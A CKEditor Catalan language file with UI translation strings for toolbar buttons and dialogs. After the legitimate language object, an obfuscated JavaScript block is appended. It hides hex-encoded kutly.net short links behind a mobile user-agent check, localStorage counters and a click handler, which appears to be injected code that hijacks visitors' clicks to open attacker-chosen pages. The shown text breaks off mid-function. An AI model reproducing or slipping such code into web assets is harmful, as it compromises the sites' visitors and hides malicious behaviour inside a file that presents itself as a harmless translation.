﻿/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Catalan language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['ca'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Editor de text enriquit, %1',

	// Toolbar buttons without dialogs.
	source			: 'Codi font',
	newPage			: 'Nova Pàgina',
	save			: 'Desa',
	preview			: 'Visualització prèvia',
	cut				: 'Retalla',
	copy			: 'Copia',
	paste			: 'Enganxa',
	print			: 'Imprimeix',
	underline		: 'Subratllat',
	bold			: 'Negreta',
	italic			: 'Cursiva',
	selectAll		: 'Selecciona-ho tot',
	removeFormat	: 'Elimina Format',
	strike			: 'Barrat',
	subscript		: 'Subíndex',
	superscript		: 'Superíndex',
	horizontalrule	: 'Insereix línia horitzontal',
	pagebreak		: 'Insereix salt de pàgina',
	unlink			: 'Elimina l\'enllaç',
	undo			: 'Desfés',
	redo			: 'Refés',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Veure servidor',
		url				: 'URL',
		protocol		: 'Protocol',
		upload			: 'Puja',
		uploadSubmit	: 'Envia-la al servidor',
		image			: 'Imatge',
		flash			: 'Flash',
		form			: 'Formulari',
		checkbox		: 'Casella de verificació',
		radio		: 'Botó d\'opció',
		textField		: 'Camp de text',
		textarea		: 'Àrea de text',
		hiddenField		: 'Camp ocult',
		button			: 'Botó',
		select	: 'Camp de selecció',
		imageButton		: 'Botó d\'imatge',
		notSet			: '<no definit>',
		id				: 'Id',
		name			: 'Nom',
		langDir			: 'Direcció de l\'idioma',
		langDirLtr		: 'D\'esquerra a dreta (LTR)',
		langDirRtl		: 'De dreta a esquerra (RTL)',
		langCode		: 'Codi d\'idioma',
		longDescr		: 'Descripció llarga de la URL',
		cssClass		: 'Classes del full d\'estil',
		advisoryTitle	: 'Títol consultiu',
		cssStyle		: 'Estil',
		ok				: 'D\'acord',
		cancel			: 'Cancel·la',
		generalTab		: 'General',
		advancedTab		: 'Avançat',
		validateNumberFailed	: 'Aquest valor no és un número.',
		confirmNewPage	: 'Els canvis en aquest contingut que no es desin es perdran. Esteu segur que voleu carregar una pàgina nova?',
		confirmCancel	: 'Algunes opcions s\'han canviat. Esteu segur que voleu tancar la finestra de diàleg?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, no disponible</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Insereix caràcter especial',
		title		: 'Selecciona el caràcter especial'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Insereix/Edita enllaç',
		menu		: 'Edita l\'enllaç',
		title		: 'Enllaç',
		info		: 'Informació de l\'enllaç',
		target		: 'Destí',
		upload		: 'Puja',
		advanced	: 'Avançat',
		type		: 'Tipus d\'enllaç',
		toAnchor	: 'Àncora en aquesta pàgina',
		toEmail		: 'Correu electrònic',
		target		: 'Destí',
		targetNotSet	: '<no definit>',
		targetFrame	: '<marc>',
		targetPopup	: '<finestra emergent>',
		targetNew	: 'Nova finestra (_blank)',
		targetTop	: 'Finestra Major (_top)',
		targetSelf	: 'Mateixa finestra (_self)',
		targetParent	: 'Finestra pare (_parent)',
		targetFrameName	: 'Nom del marc de destí',
		targetPopupName	: 'Nom finestra popup',
		popupFeatures	: 'Característiques finestra popup',
		popupResizable	: 'Redimensionable',
		popupStatusBar	: 'Barra d\'estat',
		popupLocationBar	: 'Barra d\'adreça',
		popupToolbar	: 'Barra d\'eines',
		popupMenuBar	: 'Barra de menú',
		popupFullScreen	: 'Pantalla completa (IE)',
		popupScrollBars	: 'Barres d\'scroll',
		popupDependent	: 'Depenent (Netscape)',
		popupWidth		: 'Amplada',
		popupLeft		: 'Posició esquerra',
		popupHeight		: 'Alçada',
		popupTop		: 'Posició dalt',
		id				: 'Id',
		langDir			: 'Direcció de l\'idioma',
		langDirNotSet	: '<no definit>',
		langDirLTR		: 'D\'esquerra a dreta (LTR)',
		langDirRTL		: 'De dreta a esquerra (RTL)',
		acccessKey		: 'Clau d\'accés',
		name			: 'Nom',
		langCode		: 'Direcció de l\'idioma',
		tabIndex		: 'Index de Tab',
		advisoryTitle	: 'Títol consultiu',
		advisoryContentType	: 'Tipus de contingut consultiu',
		cssClasses		: 'Classes del full d\'estil',
		charset			: 'Conjunt de caràcters font enllaçat',
		styles			: 'Estil',
		selectAnchor	: 'Selecciona una àncora',
		anchorName		: 'Per nom d\'àncora',
		anchorId		: 'Per Id d\'element',
		emailAddress	: 'Adreça de correu electrònic',
		emailSubject	: 'Assumpte del missatge',
		emailBody		: 'Cos del missatge',
		noAnchors		: '(No hi ha àncores disponibles en aquest document)',
		noUrl			: 'Si us plau, escrigui l\'enllaç URL',
		noEmail			: 'Si us plau, escrigui l\'adreça correu electrònic'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Insereix/Edita àncora',
		menu		: 'Propietats de l\'àncora',
		title		: 'Propietats de l\'àncora',
		name		: 'Nom de l\'àncora',
		errorName	: 'Si us plau, escriviu el nom de l\'ancora'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Cerca i reemplaça',
		find				: 'Cerca',
		replace				: 'Reemplaça',
		findWhat			: 'Cerca:',
		replaceWith			: 'Remplaça amb:',
		notFoundMsg			: 'El text especificat no s\'ha trobat.',
		matchCase			: 'Distingeix majúscules/minúscules',
		matchWord			: 'Només paraules completes',
		matchCyclic			: 'Match cyclic',
		replaceAll			: 'Reemplaça-ho tot',
		replaceSuccessMsg	: '%1 ocurrència/es reemplaçada/es.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Taula',
		title		: 'Propietats de la taula',
		menu		: 'Propietats de la taula',
		deleteTable	: 'Suprimeix la taula',
		rows		: 'Files',
		columns		: 'Columnes',
		border		: 'Mida vora',
		align		: 'Alineació',
		alignNotSet	: '<No Definit>',
		alignLeft	: 'Esquerra',
		alignCenter	: 'Centre',
		alignRight	: 'Dreta',
		width		: 'Amplada',
		widthPx		: 'píxels',
		widthPc		: 'percentatge',
		height		: 'Alçada',
		cellSpace	: 'Espaiat de cel·les',
		cellPad		: 'Encoixinament de cel·les',
		caption		: 'Títol',
		summary		: 'Resum',
		headers		: 'Capçaleres',
		headersNone		: 'Cap',
		headersColumn	: 'Primera columna',
		headersRow		: 'Primera fila',
		headersBoth		: 'Ambdues',
		invalidRows		: 'El nombre de files ha de ser un nombre major que 0.',
		invalidCols		: 'El nombre de columnes ha de ser un nombre major que 0.',
		invalidBorder	: 'El gruix de la vora ha de ser un nombre.',
		invalidWidth	: 'L\'amplada de la taula  ha de ser un nombre.',
		invalidHeight	: 'L\'alçada de la taula  ha de ser un nombre.',
		invalidCellSpacing	: 'L\'espaiat de cel·la  ha de ser un nombre.',
		invalidCellPadding	: 'L\'encoixinament de cel·la  ha de ser un nombre.',

		cell :
		{
			menu			: 'Cel·la',
			insertBefore	: 'Insereix cel·la abans de',
			insertAfter		: 'Insereix cel·la darrera',
			deleteCell		: 'Suprimeix les cel·les',
			merge			: 'Fusiona les cel·les',
			mergeRight		: 'Fusiona cap a la dreta',
			mergeDown		: 'Fusiona cap avall',
			splitHorizontal	: 'Divideix la cel·la horitzontalment',
			splitVertical	: 'Divideix la cel·la verticalment',
			title			: 'Propertiat de la cel·la',
			cellType		: 'Tipus de cel·la',
			rowSpan			: 'Expansió de files',
			colSpan			: 'Expansió de columnes',
			wordWrap		: 'Ajustar al contingut',
			hAlign			: 'Aliniació Horizontal',
			vAlign			: 'Aliniació Vertical',
			alignTop		: 'A dalt',
			alignMiddle		: 'Al mig',
			alignBottom		: 'A baix',
			alignBaseline	: 'A la línia base',
			bgColor			: 'Color de fons',
			borderColor		: 'Color de la vora',
			data			: 'Data',
			header			: 'Capçalera',
			yes				: 'Sí',
			no				: 'No',
			invalidWidth	: 'L\'amplada de cel·la ha de ser un nombre.',
			invalidHeight	: 'L\'alçada de cel·la ha de ser un nombre.',
			invalidRowSpan	: 'L\'expansió de files ha de ser un nombre enter.',
			invalidColSpan	: 'L\'expansió de columnes ha de ser un nombre enter.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Fila',
			insertBefore	: 'Insereix fila abans de',
			insertAfter		: 'Insereix fila darrera',
			deleteRow		: 'Suprimeix una fila'
		},

		column :
		{
			menu			: 'Columna',
			insertBefore	: 'Insereix columna abans de',
			insertAfter		: 'Insereix columna darrera',
			deleteColumn	: 'Suprimeix una columna'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Propietats del botó',
		text		: 'Text (Valor)',
		type		: 'Tipus',
		typeBtn		: 'Botó',
		typeSbm		: 'Transmet formulari',
		typeRst		: 'Reinicia formulari'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Propietats de la casella de verificació',
		radioTitle	: 'Propietats del botó d\'opció',
		value		: 'Valor',
		selected	: 'Seleccionat'
	},

	// Form Dialog.
	form :
	{
		title		: 'Propietats del formulari',
		menu		: 'Propietats del formulari',
		action		: 'Acció',
		method		: 'Mètode',
		encoding	: 'Codificació',
		target		: 'Destí',
		targetNotSet	: '<no definit>',
		targetNew	: 'Nova finestra (_blank)',
		targetTop	: 'Finestra Major (_top)',
		targetSelf	: 'Mateixa finestra (_self)',
		targetParent	: 'Finestra pare (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Propietats del camp de selecció',
		selectInfo	: 'Info',
		opAvail		: 'Opcions disponibles',
		value		: 'Valor',
		size		: 'Mida',
		lines		: 'Línies',
		chkMulti	: 'Permet múltiples seleccions',
		opText		: 'Text',
		opValue		: 'Valor',
		btnAdd		: 'Afegeix',
		btnModify	: 'Modifica',
		btnUp		: 'Amunt',
		btnDown		: 'Avall',
		btnSetValue : 'Selecciona per defecte',
		btnDelete	: 'Elimina'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Propietats de l\'àrea de text',
		cols		: 'Columnes',
		rows		: 'Files'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Propietats del camp de text',
		name		: 'Nom',
		value		: 'Valor',
		charWidth	: 'Amplada',
		maxChars	: 'Nombre màxim de caràcters',
		type		: 'Tipus',
		typeText	: 'Text',
		typePass	: 'Contrasenya'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Propietats del camp ocult',
		name	: 'Nom',
		value	: 'Valor'
	},

	// Image Dialog.
	image :
	{
		title		: 'Propietats de la imatge',
		titleButton	: 'Propietats del botó d\'imatge',
		menu		: 'Propietats de la imatge',
		infoTab	: 'Informació de la imatge',
		btnUpload	: 'Envia-la al servidor',
		url		: 'URL',
		upload	: 'Puja',
		alt		: 'Text alternatiu',
		width		: 'Amplada',
		height	: 'Alçada',
		lockRatio	: 'Bloqueja les proporcions',
		resetSize	: 'Restaura la mida',
		border	: 'Vora',
		hSpace	: 'Espaiat horit.',
		vSpace	: 'Espaiat vert.',
		align		: 'Alineació',
		alignLeft	: 'Ajusta a l\'esquerra',
		alignRight	: 'Ajusta a la dreta',
		preview	: 'Vista prèvia',
		alertUrl	: 'Si us plau, escriviu la URL de la imatge',
		linkTab	: 'Enllaç',
		button2Img	: 'Voleu transformar el botó d\'imatge seleccionat en una simple imatge?',
		img2Button	: 'Voleu transformar la imatge seleccionada en un botó d\'imatge?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Propietats del Flash',
		propertiesTab	: 'Propietats',
		title		: 'Propietats del Flash',
		chkPlay		: 'Reprodució automàtica',
		chkLoop		: 'Bucle',
		chkMenu		: 'Habilita menú Flash',
		chkFull		: 'Permetre la pantalla completa',
 		scale		: 'Escala',
		scaleAll		: 'Mostra-ho tot',
		scaleNoBorder	: 'Sense vores',
		scaleFit		: 'Mida exacta',
		access			: 'Accés a scripts',
		accessAlways	: 'Sempre',
		accessSameDomain	: 'El mateix domini',
		accessNever	: 'Mai',
		align		: 'Alineació',
		alignLeft	: 'Ajusta a l\'esquerra',
		alignAbsBottom: 'Abs Bottom',
		alignAbsMiddle: 'Abs Middle',
		alignBaseline	: 'Baseline',
		alignBottom	: 'Bottom',
		alignMiddle	: 'Middle',
		alignRight	: 'Ajusta a la dreta',
		alignTextTop	: 'Text Top',
		alignTop	: 'Top',
		quality		: 'Qualitat',
		qualityBest		 : 'La millor',
		qualityHigh		 : 'Alta',
		qualityAutoHigh	 : 'Alta automàtica',
		qualityMedium	 : 'Mitjana',
		qualityAutoLow	 : 'Baixa automàtica',
		qualityLow		 : 'Baixa',
		windowModeWindow	 : 'Finestra',
		windowModeOpaque	 : 'Opaca',
		windowModeTransparent	 : 'Transparent',
		windowMode	: 'Mode de la finestra',
		flashvars	: 'Variables de Flash',
		bgcolor	: 'Color de Fons',
		width	: 'Amplada',
		height	: 'Alçada',
		hSpace	: 'Espaiat horit.',
		vSpace	: 'Espaiat vert.',
		validateSrc : 'Si us plau, escrigui l\'enllaç URL',
		validateWidth : 'L\'amplada ha de ser un nombre.',
		validateHeight : 'L\'alçada ha de ser un nombre.',
		validateHSpace : 'L\'espaiat horitzonatal ha de ser un nombre.',
		validateVSpace : 'L\'espaiat vertical ha de ser un nombre.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Revisa l\'ortografia',
		title			: 'Comprova l\'ortografia',
		notAvailable	: 'El servei no es troba disponible ara.',
		errorLoading	: 'Error carregant el servidor: %s.',
		notInDic		: 'No és al diccionari',
		changeTo		: 'Reemplaça amb',
		btnIgnore		: 'Ignora',
		btnIgnoreAll	: 'Ignora-les totes',
		btnReplace		: 'Canvia',
		btnReplaceAll	: 'Canvia-les totes',
		btnUndo			: 'Desfés',
		noSuggestions	: 'Cap suggeriment',
		progress		: 'Verificació ortogràfica en curs...',
		noMispell		: 'Verificació ortogràfica acabada: no hi ha cap paraula mal escrita',
		noChanges		: 'Verificació ortogràfica: no s\'ha canviat cap paraula',
		oneChange		: 'Verificació ortogràfica: s\'ha canviat una paraula',
		manyChanges		: 'Verificació ortogràfica: s\'han canviat %1 paraules',
		ieSpellDownload	: 'Verificació ortogràfica no instal·lada. Voleu descarregar-ho ara?'
	},

	smiley :
	{
		toolbar	: 'Icona',
		title	: 'Insereix una icona'
	},

	elementsPath :
	{
		eleTitle : '%1 element'
	},

	numberedlist : 'Llista numerada',
	bulletedlist : 'Llista de pics',
	indent : 'Augmenta el sagnat',
	outdent : 'Redueix el sagnat',

	justify :
	{
		left : 'Alinia a l\'esquerra',
		center : 'Centrat',
		right : 'Alinia a la dreta',
		block : 'Justificat'
	},

	blockquote : 'Bloc de cita',

	clipboard :
	{
		title		: 'Enganxa',
		cutError	: 'La seguretat del vostre navegador no permet executar automàticament les operacions de retallar. Si us plau, utilitzeu el teclat (Ctrl+X).',
		copyError	: 'La seguretat del vostre navegador no permet executar automàticament les operacions de copiar. Si us plau, utilitzeu el teclat (Ctrl+C).',
		pasteMsg	: 'Si us plau, enganxeu dins del següent camp utilitzant el teclat (<STRONG>Ctrl+V</STRONG>) i premeu <STRONG>OK</STRONG>.',
		securityMsg	: 'A causa de la configuració de seguretat del vostre navegador, l\'editor no pot accedir al porta-retalls directament. Enganxeu-ho un altre cop en aquesta finestra.'
	},

	pastefromword :
	{
		confirmCleanup : 'El text que voleu enganxar sembla provenir de Word. Voleu netejar aquest text abans que sigui enganxat?',
		toolbar : 'Enganxa des del Word',
		title : 'Enganxa des del Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Enganxa com a text no formatat',
		title : 'Enganxa com a text no formatat'
	},

	templates :
	{
		button : 'Plantilles',
		title : 'Contingut plantilles',
		insertOption: 'Reemplaça el contingut actual',
		selectPromptMsg: 'Si us plau, seleccioneu la plantilla per obrir a l\'editor<br>(el contingut actual no serà enregistrat):',
		emptyListMsg : '(No hi ha plantilles definides)'
	},

	showBlocks : 'Mostra els blocs',

	stylesCombo :
	{
		label : 'Estil',
		voiceLabel : 'Estils',
		panelVoiceLabel : 'Seleccioneu un estil',
		panelTitle1 : 'Estils de bloc',
		panelTitle2 : 'Estils incrustats',
		panelTitle3 : 'Estils d\'objecte'
	},

	format :
	{
		label : 'Format',
		voiceLabel : 'Format',
		panelTitle : 'Format',
		panelVoiceLabel : 'Seleccioneu un format de paràgraf',

		tag_p : 'Normal',
		tag_pre : 'Formatejat',
		tag_address : 'Adreça',
		tag_h1 : 'Encapçalament 1',
		tag_h2 : 'Encapçalament 2',
		tag_h3 : 'Encapçalament 3',
		tag_h4 : 'Encapçalament 4',
		tag_h5 : 'Encapçalament 5',
		tag_h6 : 'Encapçalament 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Tipus de lletra',
		voiceLabel : 'Tipus de lletra',
		panelTitle : 'Tipus de lletra',
		panelVoiceLabel : 'Seleccioneu un tipus de lletra'
	},

	fontSize :
	{
		label : 'Mida',
		voiceLabel : 'Mida de la lletra',
		panelTitle : 'Mida',
		panelVoiceLabel : 'Seleccioneu una mida de lletra'
	},

	colorButton :
	{
		textColorTitle : 'Color de Text',
		bgColorTitle : 'Color de Fons',
		auto : 'Automàtic',
		more : 'Més colors...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Spell Check As You Type',
		enable : 'Habilitat l\'SCAYT',
		disable : 'Deshabilita SCAYT',
		about : 'Quant a l\'SCAYT',
		toggle : 'Commuta l\'SCAYT',
		options : 'Opcions',
		langs : 'Idiomes',
		moreSuggestions : 'Més suggerències',
		ignore : 'Ignora',
		ignoreAll : 'Ignora\'ls tots',
		addWord : 'Afegeix una paraula',
		emptyDic : 'El nom del diccionari no hauria d\'estar buit.',
		optionsTab : 'Opcions',
		languagesTab : 'Idiomes',
		dictionariesTab : 'Diccionaris',
		aboutTab : 'Quant a'
	},

	about :
	{
		title : 'Quan al CKEditor',
		dlgTitle : 'Quan al CKEditor',
		moreInfo : 'Per informació sobre llicències visiteu el web:',
		copy : 'Copyright &copy; $1. All rights reserved.'
	},

	maximize : 'Maximiza',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Àncora',
		flash : 'Animació Flash',
		div : 'Salt de pàgina',
		unknown : 'Objecte desconegut'
	},

	resize : 'Arrossegueu per redimensionar',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return 